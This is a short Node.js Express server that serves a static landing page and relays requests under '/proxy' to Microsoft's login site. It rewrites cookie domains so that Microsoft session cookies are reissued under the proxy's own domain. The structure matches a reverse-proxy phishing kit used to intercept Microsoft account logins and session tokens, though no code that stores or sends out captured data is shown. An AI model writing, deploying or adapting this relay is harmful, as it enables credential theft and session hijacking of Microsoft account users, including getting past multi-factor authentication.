const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files
app.use(express.static('public'));

// Proxy to Microsoft login
app.use('/proxy', createProxyMiddleware({
  target: 'https://login.microsoftonline.com',
  changeOrigin: true,
  secure: true,
  cookieDomainRewrite: { '*': '' }
}));

// Landing page
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
  console.log(`✅ Proxy running on port ${PORT}`);
});
